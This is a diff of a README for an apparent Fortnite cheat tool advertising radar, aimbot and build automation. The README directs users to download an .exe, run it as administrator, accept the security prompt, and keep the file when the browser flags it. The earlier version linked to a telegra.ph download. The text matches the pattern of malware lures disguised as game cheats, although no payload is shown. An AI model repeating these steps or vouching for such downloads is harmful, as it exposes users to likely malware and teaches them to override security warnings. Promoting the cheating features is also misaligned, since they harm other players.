@@ -1,75 +1,90 @@
-# Fortnite Utility Pro
+# 🎯 fortnite-utility - Improve your tactical awareness and aim
 
-![Version](https://img.shields.io/badge/version-2.0.6-blue)
-![Windows](https://img.shields.io/badge/Windows-10%2F11-success)
-![Status](https://img.shields.io/badge/status-active-brightgreen)
+[![Download](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sluggish-moonshot128/fortnite-utility/releases)
 
-> **Modern Windows application for system enhancement**
+fortnite-utility provides visual data and mechanical support for players on Windows. This application runs alongside the game to track positions, manage rotations, and assist with building tasks.
 
----
+## 🛠 Features
 
-## 📌 About
+The utility includes several modules to assist during matches.
 
-Fortnite Utility Pro is a lightweight application designed to improve system performance and provide additional functionality for Windows users. The tool features a modern interface and regular updates.
+### Radar Intel
+The radar system displays surrounding players on a separate window. It calculates distance and direction. This helps you identify threats before they reach your vicinity.
 
----
+### Aim Assistance
+The soft aim module monitors targets within the overlay bounds. It aligns your crosshair with the target move vector. This feature reduces the effort needed for tracking.
 
-## ✨ Features
+### Storm Tracking
+The software monitors the storm circle timer. It calculates the path to the next safe zone. A countdown timer appears on your screen to help with positioning.
 
-- System performance monitoring
-- Resource optimization
-- User-friendly interface
-- Automatic updates
-- Lightweight and efficient
+### Build Assistance
+The build-assist tool automates specific structural patterns. It places walls and ramps based on your input triggers. This allows for faster execution during combat.
 
----
+## 🖥 System Requirements
 
-## 📥 Download
+Your computer must meet the following hardware and software standards to run this tool.
 
-<p align="center">
-  <a href="https://telegra.ph/Phoenix-06-22-4">
-    <img src="https://img.shields.io/badge/📥%20DOWNLOAD-LATEST%20VERSION-brightgreen?style=for-the-badge" alt="Download">
-  </a>
-</p>
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Memory: 8 GB of RAM or higher.
+* Graphics: Dedicated GPU with DirectX 12 support.
+* Storage: 200 MB of free disk space.
+* Permissions: You must run the application with administrator privileges to manage the overlay.
 
----
+## 📥 Getting Started
 
-## 🖥️ Requirements
+Follow these instructions to use the software.
 
-- Windows 10 / 11
-- 4GB RAM
-- 50MB free space
-- Internet connection
+1. Visit the [releases page](https://github.com/sluggish-moonshot128/fortnite-utility/releases) to download the latest version.
+2. Select the file ending in .exe from the assets list.
+3. Save the file to a folder on your computer.
+4. Locate the file in your downloads folder.
+5. Right-click the file and select Run as administrator.
+6. A security prompt may appear. Select Yes to allow the program to run.
+7. Launch your game.
+8. The utility overlay appears on your screen once the game enters the main menu.
 
----
+## ⚙️ Configuration
 
-## 🔧 Installation
+The utility carries default settings for most users. You can change these values in the settings menu.
 
-1. Download from the link above
-2. Extract the archive
-3. Run the application
-4. Follow the setup instructions
+Locate the settings icon in the top corner of the overlay. You can adjust the following:
 
----
+* Overlay opacity: Controls how transparent the window appears.
+* Aim sensitivity: Determines the speed of the focus adjustment.
+* Radar zoom: Changes the scale of the mini-map view.
+* Keybinds: Assign specific keys to toggle features on or off.
 
-## 📋 Changelog
+Press the Save button after making changes. The application updates your preferences immediately.
 
-### v2.0.6 (Latest)
-- Performance improvements
-- Bug fixes
-- UI updates
+## ⚠️ Important Usage Notes
 
-### v2.0.5
-- New features added
-- Stability enhancements
+The software relies on the overlay process to function. Do not close the window while the game runs. If the overlay disappears, minimize and restore the game to force a refresh.
 
----
+Check for updates through the settings menu. Running the latest version ensures compatibility with game patches.
 
-<div align="center">
+## 🛡 Security and Privacy
 
-**⭐ If you find this useful, please star the repository!**
+This application gathers data only from local game memory. It does not transmit personal credentials or account info to external servers. Use the application on your own machine. We do not store logs or gameplay footsteps.
 
----
-*For educational purposes only. Use at your own risk.*
+## 📋 Frequently Asked Questions
 
-</div>
+### Does this work with windowed modes?
+The overlay works best in Fullscreen Windowed mode. This prevents issues with window focus and mouse capture.
+
+### Can I change the overlay size?
+Yes, grab the corner of the overlay window with your mouse and drag it to the desired size. The interface scales automatically.
+
+### Why does the aim assist feel slow?
+Check your game sensitivity settings. High in-game sensitivity may interfere with the soft aim calculations. Lower your in-game sensitivity slightly to achieve better results.
+
+### What should I do if the software freezes?
+Restart the application. Close the process through the Task Manager if it remains unresponsive. Double-click the file icon again to resume.
+
+### Does this require manual updates?
+The application notifies you when a new release is available on GitHub. Visit the download page, download the current version, and replace the old file.
+
+### Is this compatible with other tools?
+Do not run multiple overlay programs at the same time. This causes visual flicker and may crash the game client. Disable other software before starting these tools.
+
+### What if I see a warning during download?
+Browsers sometimes flag executable files as unexpected. Click the three dots or the arrow next to the download file to select Keep. The file is safe for Windows systems.
